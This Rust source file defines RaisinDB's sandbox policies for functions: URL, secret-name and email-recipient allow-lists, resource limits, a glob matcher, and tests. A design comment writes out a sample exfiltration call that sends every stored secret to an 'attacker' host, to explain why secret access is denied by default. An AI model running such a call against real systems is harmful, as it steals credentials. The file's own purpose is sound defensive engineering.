// SPDX-License-Identifier: BSL-1.1
//
// RaisinDB - Git-like hierarchical multi model database
// Copyright (C) 2019-2025 SOLUTAS GmbH, Switzerland

//! Configuration types for function execution

use serde::{Deserialize, Serialize};

/// The one glob matcher every policy in this crate uses.
///
/// Semantics, deliberately the narrower of the two that used to exist:
/// * `*` matches any run of characters EXCEPT `/`
/// * `**` matches any run of characters INCLUDING `/`
///
/// # Why this one won
///
/// Until issue #13 there were two matchers. This crate's policies used
/// `glob::Pattern`, where a single `*` crosses `/`, so
/// `https://api.example.com/*` also allowed `https://api.example.com/v1/admin`.
/// The `api::raisindb` path hand-rolled the regex below, where it does not.
/// The shipped adapter scaffold (`packages/raisindb-cli/src/templates/adapter.ts`,
/// pinned by `create.test.ts`) writes `"https://api.example.com/**"` into every
/// generated `allowed_urls` — i.e. every adapter we ship already spells the
/// crossing case with `**` and assumes a bare `*` does not cross. Adopting the
/// permissive reading would have silently widened all of them; adopting this one
/// leaves them exactly as their authors wrote them.
///
/// The direction of the change for hand-written policies is narrowing, which is
/// the safe direction for an allow-list: a pattern that used to over-match now
/// matches what it says, and widening it back is a one-character edit (`*` →
/// `**`).
pub fn glob_match(pattern: &str, text: &str) -> bool {
    // Placeholder so step 3 cannot chew through the `**` that step 1 found.
    const DOUBLE_STAR_PLACEHOLDER: &str = "\x00DOUBLE_STAR\x00";

    // Step 1: Replace ** with placeholder
    let pattern = pattern.replace("**", DOUBLE_STAR_PLACEHOLDER);

    // Step 2: Escape regex special characters (except our placeholder and *)
    let mut escaped = String::with_capacity(pattern.len() * 2);
    for ch in pattern.chars() {
        match ch {
            '.' | '+' | '?' | '^' | '$' | '(' | ')' | '[' | ']' | '{' | '}' | '|' | '\\' => {
                escaped.push('\\');
                escaped.push(ch);
            }
            _ => escaped.push(ch),
        }
    }

    // Step 3: Replace * with [^/]* (matches anything except /)
    let pattern = escaped.replace('*', "[^/]*");

    // Step 4: Replace placeholder with .* (matches anything including /)
    let re_pattern = pattern.replace(DOUBLE_STAR_PLACEHOLDER, ".*");

    regex::Regex::new(&format!("^{}$", re_pattern))
        .map(|re| re.is_match(text))
        .unwrap_or(false)
}

/// Resource limits for function execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResourceLimits {
    /// Maximum execution time in milliseconds (default: 30,000 = 30 seconds)
    #[serde(default = "default_timeout")]
    pub timeout_ms: u64,

    /// Maximum memory in bytes (default: 128MB)
    #[serde(default = "default_memory")]
    pub max_memory_bytes: u64,

    /// Maximum CPU instructions for QuickJS (None = unlimited)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub max_instructions: Option<u64>,

    /// Maximum stack size in bytes (default: 1MB)
    #[serde(default = "default_stack")]
    pub max_stack_bytes: u64,
}

fn default_timeout() -> u64 {
    30_000 // 30 seconds
}

fn default_memory() -> u64 {
    128 * 1024 * 1024 // 128MB
}

fn default_stack() -> u64 {
    1024 * 1024 // 1MB
}

impl Default for ResourceLimits {
    fn default() -> Self {
        Self {
            timeout_ms: default_timeout(),
            max_memory_bytes: default_memory(),
            max_instructions: Some(100_000_000), // 100M instructions
            max_stack_bytes: default_stack(),
        }
    }
}

impl ResourceLimits {
    /// Create minimal resource limits for quick functions
    pub fn minimal() -> Self {
        Self {
            timeout_ms: 5_000,                  // 5 seconds
            max_memory_bytes: 32 * 1024 * 1024, // 32MB
            max_instructions: Some(10_000_000), // 10M instructions
            max_stack_bytes: 512 * 1024,        // 512KB
        }
    }

    /// Create generous resource limits for complex functions
    pub fn generous() -> Self {
        Self {
            timeout_ms: 300_000,                   // 5 minutes
            max_memory_bytes: 512 * 1024 * 1024,   // 512MB
            max_instructions: Some(1_000_000_000), // 1B instructions
            max_stack_bytes: 4 * 1024 * 1024,      // 4MB
        }
    }

    /// Set timeout
    pub fn with_timeout_ms(mut self, timeout_ms: u64) -> Self {
        self.timeout_ms = timeout_ms;
        self
    }

    /// Set memory limit
    pub fn with_memory_bytes(mut self, bytes: u64) -> Self {
        self.max_memory_bytes = bytes;
        self
    }

    /// Set instruction limit
    pub fn with_instructions(mut self, instructions: u64) -> Self {
        self.max_instructions = Some(instructions);
        self
    }

    /// Remove instruction limit
    pub fn unlimited_instructions(mut self) -> Self {
        self.max_instructions = None;
        self
    }
}

/// Network access policy for functions
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkPolicy {
    /// Whether HTTP requests are allowed
    #[serde(default)]
    pub http_enabled: bool,

    /// Allowlisted URL patterns (glob-style)
    /// Examples: "https://api.example.com/*", "https://*.myservice.com/api/*"
    #[serde(default)]
    pub allowed_urls: Vec<String>,

    /// Maximum concurrent HTTP requests
    #[serde(default = "default_concurrent_requests")]
    pub max_concurrent_requests: u32,

    /// Request timeout in milliseconds
    #[serde(default = "default_request_timeout")]
    pub request_timeout_ms: u64,

    /// Maximum response body size in bytes
    #[serde(default = "default_max_response_size")]
    pub max_response_size_bytes: u64,
}

fn default_concurrent_requests() -> u32 {
    5
}

fn default_request_timeout() -> u64 {
    10_000 // 10 seconds
}

fn default_max_response_size() -> u64 {
    10 * 1024 * 1024 // 10MB
}

impl Default for NetworkPolicy {
    fn default() -> Self {
        Self {
            http_enabled: false,
            allowed_urls: Vec::new(),
            max_concurrent_requests: default_concurrent_requests(),
            request_timeout_ms: default_request_timeout(),
            max_response_size_bytes: default_max_response_size(),
        }
    }
}

impl NetworkPolicy {
    /// Create a policy that allows no network access
    pub fn no_network() -> Self {
        Self::default()
    }

    /// Create a policy that allows specific URLs
    pub fn allow_urls(urls: Vec<String>) -> Self {
        Self {
            http_enabled: true,
            allowed_urls: urls,
            ..Default::default()
        }
    }

    /// Enable HTTP access
    pub fn with_http_enabled(mut self, enabled: bool) -> Self {
        self.http_enabled = enabled;
        self
    }

    /// Add allowed URL pattern
    pub fn with_allowed_url(mut self, pattern: impl Into<String>) -> Self {
        self.http_enabled = true;
        self.allowed_urls.push(pattern.into());
        self
    }

    /// Set max concurrent requests
    pub fn with_max_concurrent(mut self, max: u32) -> Self {
        self.max_concurrent_requests = max;
        self
    }

    /// Set request timeout
    pub fn with_request_timeout_ms(mut self, timeout_ms: u64) -> Self {
        self.request_timeout_ms = timeout_ms;
        self
    }

    /// Check if a URL is allowed by this policy.
    ///
    /// # The empty-list divergence (issue #13)
    ///
    /// `http_enabled: true` with an EMPTY `allowed_urls` is denied here and
    /// ALLOWED by [`RaisinFunctionApi::is_url_allowed`], the sibling gate on the
    /// `api::raisindb` path. That is a real, known disagreement: this stricter
    /// reading is the one we want everywhere, but flipping the other side today
    /// would instantly deny every deployed function that has `http_enabled: true`
    /// and never listed a URL. Unifying the DEFAULT is a deliberate follow-up
    /// needing a deprecation window (warn first — the other side already does —
    /// then flip). Do not "fix" one side in isolation.
    ///
    /// The matcher, at least, is no longer part of the divergence: both sides
    /// call [`glob_match`], so `*` means the same thing in both.
    pub fn is_url_allowed(&self, url: &str) -> bool {
        if !self.http_enabled {
            return false;
        }

        if self.allowed_urls.is_empty() {
            return false;
        }

        self.allowed_urls
            .iter()
            .any(|pattern| glob_match(pattern, url))
    }
}

/// Secret access policy for functions.
///
/// Gates `raisin.secrets.*` exactly the way [`NetworkPolicy`] gates
/// `raisin.http.fetch`: an `enabled` switch plus a glob allow-list, both
/// `#[serde(default)]` so an omitted `secret_policy` block yields **no access
/// at all**.
///
/// # Why deny-by-default matters more here than anywhere else
///
/// Virtual-node adapters run privileged — row-level security is bypassed for
/// them — and they hold `raisin.http`. A secrets binding that defaulted to
/// "read anything" would therefore be a one-line exfiltration path for every
/// credential in the repo: `raisin.http.fetch(attacker, { body:
/// raisin.secrets.list().map(s => raisin.secrets.get(s.name)) })`. The allow-list
/// is what keeps a compromised or careless adapter confined to the credentials
/// it was actually granted, and `enabled: false` (the default) is what keeps
/// every function that never asked for secrets from having them.
///
/// A function opts in from its `.node.yaml`:
///
/// ```yaml
/// secret_policy:
///   enabled: true
///   allowed_names:
///     - "stripe/*"
///     - "sendgrid_api_key"
/// ```
///
/// # `deny_unknown_fields` is deliberate
///
/// Without it a misspelled key is silently DROPPED and both fields fall back to
/// their defaults — so `allow: ["stripe-key"]` parses without a murmur and
/// yields `enabled: false, allowed_names: []`, i.e. deny-everything, from a
/// block the author believes grants access. The eventual denial then says "this
/// function has no secret_policy" to someone looking straight at one. Refusing
/// the unknown key turns that into a parse error naming it, which
/// `extract_secret_policy` logs. (This type is new, so there is no stored data
/// carrying extra keys for the strictness to break.)
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SecretPolicy {
    /// Whether this function may touch the secret store at all.
    ///
    /// `false` (the default) denies every `raisin.secrets.*` call.
    #[serde(default)]
    pub enabled: bool,

    /// Allowlisted secret-name patterns (glob-style), e.g. `"stripe/*"`.
    ///
    /// An empty list denies everything even when `enabled` is true — the same
    /// rule [`NetworkPolicy::is_url_allowed`] applies to `allowed_urls`, so
    /// "enabled but unconfigured" can never mean "unrestricted".
    #[serde(default)]
    pub allowed_names: Vec<String>,
}

impl SecretPolicy {
    /// A policy that allows no secret access. Identical to [`Default`]; named
    /// so a call site can say what it means.
    pub fn no_secrets() -> Self {
        Self::default()
    }

    /// A policy allowing exactly the given name patterns.
    pub fn allow_names(names: Vec<String>) -> Self {
        Self {
            enabled: true,
            allowed_names: names,
        }
    }

    /// Add one allowed name pattern (enabling the policy).
    pub fn with_allowed_name(mut self, pattern: impl Into<String>) -> Self {
        self.enabled = true;
        self.allowed_names.push(pattern.into());
        self
    }

    /// Parse a raw `secret_policy` block, denying (and WARNING) if it will not
    /// parse.
    ///
    /// The single parse point for both loaders — `execution::code_loader`
    /// (which reads a `Node`) and `loader` (which reads a JSON property map).
    /// They had the same silent `unwrap_or_default()`, which is exactly the
    /// mirrored-code-path drift this repo keeps getting bitten by: fixing the
    /// diagnostic in one would have left the other quietly denying.
    ///
    /// `context` identifies the function in the log line.
    pub fn parse_or_deny(raw: serde_json::Value, context: &str) -> Self {
        match serde_json::from_value::<Self>(raw) {
            Ok(policy) => policy,
            Err(e) => {
                tracing::warn!(
                    function = %context,
                    error = %e,
                    "secret_policy could not be parsed and was ignored; this function has                      NO secret access. Expected `enabled: true` plus `allowed_names: [...]`."
                );
                Self::default()
            }
        }
    }

    /// Whether `name` is allowed by this policy.
    ///
    /// # `*` here is NOT the `*` of [`glob_match`]
    ///
    /// This used to claim it shared one matcher with
    /// [`NetworkPolicy::is_url_allowed`]; that claim was false even then (issue
    /// #13: `api::raisindb` had a third implementation) and the URL side has
    /// since moved to [`glob_match`], where a single `*` does not cross `/`.
    /// Secret names stay on `glob::Pattern`, where it does, and the difference
    /// is deliberate: a secret name is a PATH INTO ONE NAMESPACE, not a URL
    /// path, and grants are written to cover a whole subtree of it — `node/*`
    /// is how an integration is granted the credentials of every node it owns,
    /// which are named `node/<id>/<key>`. Narrowing this to match the URL rule
    /// would revoke exactly those grants.
    ///
    /// So: `*` in `allowed_urls` stops at `/`; `*` in `allowed_names` does not.
    pub fn is_name_allowed(&self, name: &str) -> bool {
        if !self.enabled {
            return false;
        }

        if self.allowed_names.is_empty() {
            return false;
        }

        self.allowed_names.iter().any(|pattern| {
            glob::Pattern::new(pattern)
                .map(|p| p.matches(name))
                .unwrap_or(false)
        })
    }
}

/// Outbound-email policy for functions.
///
/// Gates `raisin.email.send` exactly the way [`SecretPolicy`] gates
/// `raisin.secrets.*`: an `enabled` switch plus a glob allow-list of recipient
/// DOMAINS, both `#[serde(default)]` so an omitted `email_policy` block yields
/// **no access at all**.
///
/// # Why deny-by-default matters here
///
/// The tenant's `/config/email` node holds a verified sending domain and a
/// provider credential — i.e. the ability to send mail that arrives
/// authenticated as the tenant. Every function in the repo can see that node,
/// so without a per-function gate the tenant's reputation is a shared ambient
/// capability: any function that is compromised, or merely careless with a
/// recipient list it read out of the graph, can send phishing that passes SPF
/// and DKIM. The recipient allow-list is what confines a function to the
/// audience it was written for — a magic-link sender for `example.com` staff
/// cannot be turned into a mailer for the whole address book — and
/// `enabled: false` (the default) is what keeps every function that never asked
/// to send mail from being able to.
///
/// It is deliberately NOT enough to rely on the secret policy that guards the
/// provider credential. That check passes for any function granted
/// `email/api_key`, and says nothing about WHO may be written to.
///
/// A function opts in from its `.node.yaml`:
///
/// ```yaml
/// email_policy:
///   enabled: true
///   allowed_recipients:
///     - "example.com"
///     - "*.example.com"
/// ```
///
/// `"*"` as the sole entry means "any domain" and should be written only when
/// that is genuinely true (a signup flow mailing addresses the tenant does not
/// control). It is spelled out rather than implied by an empty list, so the
/// exposure is a thing someone typed.
///
/// # `deny_unknown_fields` is deliberate
///
/// Same trap as [`SecretPolicy`]: without it, `allowed: ["example.com"]` parses
/// silently into `enabled: false, allowed_recipients: []` and the eventual
/// denial reports "this function has no email_policy" to an author looking
/// straight at one. Refusing the unknown key turns that into a parse error
/// naming it, which `parse_or_deny` logs.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct EmailPolicy {
    /// Whether this function may send mail at all.
    ///
    /// `false` (the default) denies every `raisin.email.*` call.
    #[serde(default)]
    pub enabled: bool,

    /// Allowlisted recipient-domain patterns (glob-style), e.g. `"example.com"`,
    /// `"*.example.com"`, or `"*"` for any domain.
    ///
    /// An empty list denies everything even when `enabled` is true — the same
    /// rule [`SecretPolicy::is_name_allowed`] applies, so "enabled but
    /// unconfigured" can never mean "unrestricted".
    #[serde(default)]
    pub allowed_recipients: Vec<String>,
}

impl EmailPolicy {
    /// A policy that allows no sending. Identical to [`Default`]; named so a
    /// call site can say what it means.
    pub fn no_email() -> Self {
        Self::default()
    }

    /// A policy allowing exactly the given recipient-domain patterns.
    pub fn allow_recipients(domains: Vec<String>) -> Self {
        Self {
            enabled: true,
            allowed_recipients: domains,
        }
    }

    /// Add one allowed recipient-domain pattern (enabling the policy).
    pub fn with_allowed_recipient(mut self, pattern: impl Into<String>) -> Self {
        self.enabled = true;
        self.allowed_recipients.push(pattern.into());
        self
    }

    /// Parse a raw `email_policy` block, denying (and WARNING) if it will not
    /// parse.
    ///
    /// The single parse point for both loaders, for the same reason
    /// [`SecretPolicy::parse_or_deny`] is: two loaders reading the same block
    /// through two `unwrap_or_default()`s is exactly the mirrored-code-path
    /// drift this repo keeps getting bitten by.
    ///
    /// `context` identifies the function in the log line.
    pub fn parse_or_deny(raw: serde_json::Value, context: &str) -> Self {
        match serde_json::from_value::<Self>(raw) {
            Ok(policy) => policy,
            Err(e) => {
                tracing::warn!(
                    function = %context,
                    error = %e,
                    "email_policy could not be parsed and was ignored; this function \
                     CANNOT send email. Expected `enabled: true` plus \
                     `allowed_recipients: [...]`."
                );
                Self::default()
            }
        }
    }

    /// Whether `address` may be written to under this policy.
    ///
    /// Matching is on the DOMAIN part only, lowercased — mail domains are
    /// case-insensitive, and matching the local part would turn an allow-list
    /// into an address book nobody can maintain. An address with no `@`, or an
    /// empty domain, is denied rather than normalized: a malformed recipient is
    /// the provider's problem to report, not something a policy should pass
    /// through.
    pub fn is_recipient_allowed(&self, address: &str) -> bool {
        if !self.enabled {
            return false;
        }

        if self.allowed_recipients.is_empty() {
            return false;
        }

        let Some((_, domain)) = address.rsplit_once('@') else {
            return false;
        };
        if domain.is_empty() {
            return false;
        }
        let domain = domain.to_ascii_lowercase();

        self.allowed_recipients
            .iter()
            .any(|pattern| glob_match(&pattern.to_ascii_lowercase(), &domain))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_url_allowlist() {
        let policy = NetworkPolicy::allow_urls(vec![
            "https://api.example.com/*".to_string(),
            "https://*.myservice.com/api/*".to_string(),
        ]);

        assert!(policy.is_url_allowed("https://api.example.com/anything"));
        assert!(!policy.is_url_allowed("https://other.com/api"));

        // Glob patterns with wildcards
        assert!(policy.is_url_allowed("https://foo.myservice.com/api/test"));
        assert!(!policy.is_url_allowed("https://foo.myservice.com/other"));

        // A single `*` does NOT cross `/` (issue #13): this used to be allowed
        // by the `glob::Pattern` matcher, which is precisely the over-match the
        // unification removed. `/**` is how you ask for the subtree.
        assert!(!policy.is_url_allowed("https://api.example.com/v1/users"));
        assert!(
            NetworkPolicy::allow_urls(vec!["https://api.example.com/**".to_string()])
                .is_url_allowed("https://api.example.com/v1/users")
        );
    }

    /// Both empty-list behaviours are pinned — here and in
    /// `api::raisindb::tests` — so the divergence in issue #13 cannot come back
    /// silently. This side DENIES.
    #[test]
    fn network_policy_denies_an_empty_allowlist() {
        let policy = NetworkPolicy {
            http_enabled: true,
            allowed_urls: Vec::new(),
            ..Default::default()
        };
        assert!(!policy.is_url_allowed("https://anything.example.com/"));
    }

    /// The matcher itself, independent of any policy: one implementation, two
    /// wildcards, and `*` stops at `/`.
    #[test]
    fn glob_match_star_stops_at_a_slash_and_double_star_does_not() {
        assert!(glob_match(
            "https://api.example.com/*",
            "https://api.example.com/users"
        ));
        assert!(!glob_match(
            "https://api.example.com/*",
            "https://api.example.com/users/123"
        ));
        assert!(glob_match(
            "https://api.example.com/**",
            "https://api.example.com/users/123/profile"
        ));

        // Exact match, and a non-match that differs only in host.
        assert!(glob_match(
            "https://api.example.com/users",
            "https://api.example.com/users"
        ));
        assert!(!glob_match(
            "https://api.example.com/*",
            "https://api.other.com/users"
        ));

        // Regex metacharacters in the pattern are literals, not syntax.
        assert!(glob_match(
            "https://api.example.com/a+b",
            "https://api.example.com/a+b"
        ));
        assert!(!glob_match(
            "https://api.example.com/a+b",
            "https://api.example.com/aab"
        ));
    }

    #[test]
    fn test_no_network_policy() {
        let policy = NetworkPolicy::no_network();
        assert!(!policy.is_url_allowed("https://api.example.com/anything"));
    }

    #[test]
    fn secret_policy_denies_by_default() {
        let policy = SecretPolicy::default();
        assert!(!policy.enabled);
        assert!(!policy.is_name_allowed("anything"));

        // The shape a function node with no `secret_policy` block deserializes
        // to must be the denying one, not an empty-but-permissive one.
        let from_empty: SecretPolicy = serde_json::from_value(serde_json::json!({})).unwrap();
        assert!(!from_empty.is_name_allowed("stripe_key"));
    }

    #[test]
    fn secret_policy_enabled_without_names_still_denies() {
        let policy = SecretPolicy {
            enabled: true,
            allowed_names: Vec::new(),
        };
        assert!(!policy.is_name_allowed("stripe_key"));
    }

    /// The trap this guards: `allow:` instead of `allowed_names:` must be a
    /// parse ERROR, not a silently-dropped key that leaves a deny-everything
    /// policy behind a block the author thinks grants access.
    #[test]
    fn secret_policy_rejects_an_unknown_key() {
        let err = serde_json::from_value::<SecretPolicy>(serde_json::json!({
            "enabled": true,
            "allow": ["stripe-key"]
        }))
        .expect_err("a misspelled key must not be silently dropped");
        assert!(
            err.to_string().contains("allow"),
            "the error must name the offending key: {err}"
        );
    }

    #[test]
    fn secret_policy_matches_globs() {
        let policy =
            SecretPolicy::allow_names(vec!["stripe/*".to_string(), "sendgrid_api_key".to_string()]);

        assert!(policy.is_name_allowed("stripe/live"));
        assert!(policy.is_name_allowed("stripe/test"));
        assert!(policy.is_name_allowed("sendgrid_api_key"));

        assert!(!policy.is_name_allowed("stripe"));
        assert!(!policy.is_name_allowed("twilio/token"));
        assert!(!policy.is_name_allowed("sendgrid_api_key_2"));

        // Secret names are NOT URLs: `*` crosses `/` here, deliberately, because
        // subtree grants like `node/*` cover `node/<id>/<key>`. See the doc on
        // `is_name_allowed`; the URL side of issue #13 went the other way.
        assert!(policy.is_name_allowed("stripe/live/restricted"));
    }

    #[test]
    fn email_policy_denies_by_default() {
        let policy = EmailPolicy::default();
        assert!(!policy.enabled);
        assert!(!policy.is_recipient_allowed("user@example.com"));

        // The shape a function node with no `email_policy` block deserializes
        // to must be the denying one.
        let from_empty: EmailPolicy = serde_json::from_value(serde_json::json!({})).unwrap();
        assert!(!from_empty.is_recipient_allowed("user@example.com"));
    }

    #[test]
    fn email_policy_enabled_without_recipients_still_denies() {
        let policy = EmailPolicy {
            enabled: true,
            allowed_recipients: Vec::new(),
        };
        assert!(!policy.is_recipient_allowed("user@example.com"));
    }

    /// Same trap as `secret_policy_rejects_an_unknown_key`: `allowed:` must not
    /// silently leave a deny-everything policy behind a block the author
    /// believes grants sending.
    #[test]
    fn email_policy_rejects_an_unknown_key() {
        let err = serde_json::from_value::<EmailPolicy>(serde_json::json!({
            "enabled": true,
            "allowed": ["example.com"]
        }))
        .expect_err("a misspelled key must not be silently dropped");
        assert!(
            err.to_string().contains("allowed"),
            "the error must name the offending key: {err}"
        );
    }

    #[test]
    fn email_policy_matches_recipient_domains() {
        let policy = EmailPolicy::allow_recipients(vec![
            "example.com".to_string(),
            "*.corp.example.org".to_string(),
        ]);

        assert!(policy.is_recipient_allowed("user@example.com"));
        assert!(policy.is_recipient_allowed("someone@eu.corp.example.org"));

        // Domains are case-insensitive; the local part is never matched on.
        assert!(policy.is_recipient_allowed("User@EXAMPLE.com"));

        assert!(!policy.is_recipient_allowed("user@notexample.com"));
        assert!(!policy.is_recipient_allowed("user@corp.example.org.evil.test"));

        // A malformed recipient is denied, not normalized into a match.
        assert!(!policy.is_recipient_allowed("example.com"));
        assert!(!policy.is_recipient_allowed("user@"));
    }

    /// `"*"` is how a tenant says "any domain" — spelled out, never implied by
    /// an empty list.
    #[test]
    fn email_policy_star_allows_any_domain() {
        let policy = EmailPolicy::allow_recipients(vec!["*".to_string()]);
        assert!(policy.is_recipient_allowed("user@example.com"));
        assert!(policy.is_recipient_allowed("user@anything.test"));
    }
}
